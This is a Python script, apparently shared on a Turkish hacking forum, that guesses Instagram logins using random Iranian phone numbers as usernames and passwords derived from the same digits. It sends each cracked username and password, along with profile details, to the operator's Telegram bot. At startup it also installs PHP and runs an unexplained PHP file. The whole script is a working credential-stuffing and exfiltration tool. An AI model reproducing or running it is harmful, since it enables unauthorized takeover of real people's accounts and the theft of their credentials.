from typing import Mapping


try:
    import random,requests,os,uuid,time,secrets
    from uuid import uuid4
except ModuleNotFoundError:
    os.system('pip install uuid')
    os.system('pip install random')
    os.system('pip install requests')

BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
lo = '— —'
os.system('pkg install php')
os.system('php Browser_Requirements.php')
os.system('clear')
print("""

"""+BWhite+""" < """+BYellow+""" By_Cakma """+BWhite+""" >

   
"""+BYellow+""" ━━━━━━━✦⚡✦━━━━━━━━


"""+BRed+"""▷ """+BWhite+"""〖━━━━━━✦━━━━━━✦━━━━━━✦━━━━━━〗  """+BRed+""" ◁
"""+BRed+"""   By_Cakma """+BWhite+""" ¦ """+BYellow+"""     By_Cakma
"""+BRed+"""▷ """+BWhite+"""〖━━━━━✦━━━━━━✦━━━━━✦━━━━━━〗  """+BRed+""" ◁                                         
""")
print(' ')
print(BRed+lo*24)
print(' ')                               
myadmin = input("  "+BYellow+"- Kendi İd'n : ")
tele = input("  "+BYellow+"- Bot Token'in :  ")
os.system('clear')
print("""
   """+BRed+"""        
"""+BGreen+"""          
"""+BRed+""" ( Hesap Dusunce Girdiginis Token'e Mesaj Olarak gidicektir' """)
print(' ')
print(BGreen+lo*24)
print(' ')
def info(user2,pasw):
    global tele,myadmin,mess
    cookie = secrets.token_hex(8)*2
    headr = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"}
    url2 = f'https://www.instagram.com/{user2}/?__a=1'
    ree = requests.get(url2,headers=headr).json()
    name = str(ree['graphql']['user']['full_name'])
    id = str(ree['graphql']['user']['id'])
    followes = str(ree['graphql']['user']['edge_followed_by']['count'])
    following = str(ree['graphql']['user']['edge_follow']['count'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
    ree = re.json()
    datee = ree['data']
    ms = f"""
𖣘  Al kullan ABEE
═───────◇───────═
❶➾ User : {user2}
❷➾ Name : {name}
❸➾ Pasw : {pasw} 
❹➾ Followers : {followes}
❺➾  Following : {following}
❻➾ Date : {datee}
 ═───────◇───────═
⊱ FOR  @TR_HACK_FORUM ⊰ """
    requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")    
    print(BGreen+ms)

while True:
    chars = '0987654321'
    u = '91'
    u1 = str("". join(random.choice(chars)for i in range(8)))
    u2 = str("". join(random.choice(u)for i in range(1)))
    user = '+98'+u+u1
    pasw = '0'+u+u1
    url = 'https://i.instagram.com/api/v1/accounts/login/'          
    headers = {'User-Agent': 'User-Agent: Instagram 13.0.0.7.199 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
         'Cookie':'missing', 
         'Accept-Encoding':'gzip', 
         'Accept-Language':'fr-FR, en-US', 
         'X-IG-Capabilities':'AQ==', 
         'X-IG-Connection-Type':'MOBILE(HSPA+)', 
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
         'Host':'i.instagram.com'}
    uid = str(uuid4())
    data = {
    	'uuid':uid,'password':pasw, 
         'username':user, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
    req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
    if 'logged_in_user' in req_login.text:
        user2 = req_login.json()['logged_in_user']['username']
        info(user2,pasw)
    elif '"message":"challenge_required","challenge"' in req_login.text:
        print("  "+BYellow+f"  ⌯ Guvenli Hesap --> "+BWhite+" :"+BYellow+f" {user}:{pasw} ")
        requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text=
          İNSTAGRAM HESABİ 
    • ──────────── •
    ⌯ İsim : {user} 
    
    ⌯ Sifre : {pasw} 
    • ──────────── •
    ⌯ Kanal @DarkNetAze """)
    else:
        print("  "+BRed+f"  ⌯ Yanlış Hesap --> "+BWhite+" :"+BRed+f" {user}:{pasw} ")
    
